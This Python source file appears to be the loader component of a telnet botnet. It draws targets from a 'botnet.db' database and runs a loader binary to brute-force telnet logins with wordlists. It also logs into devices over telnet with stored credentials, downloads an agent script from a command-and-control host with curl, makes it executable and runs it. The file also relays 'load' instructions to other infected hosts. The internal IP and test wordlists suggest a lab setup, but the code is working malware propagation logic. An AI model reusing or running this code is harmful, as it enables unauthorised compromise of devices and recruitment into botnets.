import subprocess;
import json;
import asyncio;
import io;
import inspect;
import sys;
import os;
import telnetlib3;
import subprocess;
import socket;
import sqlite3

path = os.path.dirname(inspect.stack()[0][1])
default_bin_path = os.path.join(path, "../bin")
default_wordlist_path = os.path.join(path, "../wordlists")
default_db_path = os.path.join(os.path.dirname(inspect.stack()[0][1]), "../db/botnet.db")
DB   = os.getenv("DB_PATH", default_db_path)
CC_HOST = "172.18.0.1"
CC_PORT = "8000"
self_ip = socket.gethostbyname(socket.gethostname())

def get_con():
    con = sqlite3.connect(DB, check_same_thread=False)
    con.execute("PRAGMA journal_mode=WAL")  # safe alongside controller process
    return con

def main():
    print(f"self_ip: {self_ip}")
    brute_next_device()


# this and the below function install programs have the purpose of
# logging in to the devices and downloading the agent payload to them
async def shell(reader, writer, dev_id, username, password):
    logged_in = False

    while True:
        output = await reader.read(1024)
        if not output:
            break;

        print(output, end='', flush=True)
        if not logged_in:
            if 'login' in output:
                writer.write(username + '\r\n')
            elif 'password' in output or 'Password' in output:
                writer.write(password + '\r\n')

            elif '$' in output:
                logged_in = True
                # TODO: integrated device id management
                writer.write(f"curl http://{CC_HOST}:{CC_PORT}/payload/agent?device_id={dev_id} -o agent.sh\r\n")
        else:
            if "$" in output:
                writer.write(f"echo {dev_id} > dev_id\r\n")
                writer.write(f"chmod +x agent.sh\r\n")
                writer.write(f"./agent.sh\r\n")
                writer.write("exit\r\n")
            
def get_device_data_from_db(ip):
    con = get_con()
    rows = con.execute(
            """
            SELECT device_id, username, password
            FROM devices
            WHERE ip=?
            """, [ip]).fetchone()
    con.close()

    return rows

# picks first device from db row and brutes it, removes from tobrute and adds to device
def brute_next_device():
    con = get_con()
    rows = con.execute(
        """
        SELECT device_id, ip, scanned_by_ip
        FROM devices_tobrute
    """).fetchone()

    device_id, ip, scanned_by_ip = rows
    if (scanned_by_ip == self_ip):
        # spawn loader in this device
        subprocess.run([f"{default_bin_path}/loader_amd64", ip, "23", f"{default_wordlist_path}/testuser.txt", f"{default_wordlist_path}/testpass.txt", "20"])
        pass
    else:
        instruction = f"load {ip}"
        con.execute("""
            UPDATE devices
            SET instruction = (?)
            WHERE ip = (?)
        """, [instruction, scanned_by_ip])
        #TODO: delete after done

    con.close()

async def install_programs(ip):
    data = get_device_data_from_db(ip)
    reader, writer = await telnetlib3.client.open_connection(ip, 23);
    await shell(reader, writer, data[0], data[1], data[2]);

if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(install_programs(sys.argv[1]))
    else:
        main()
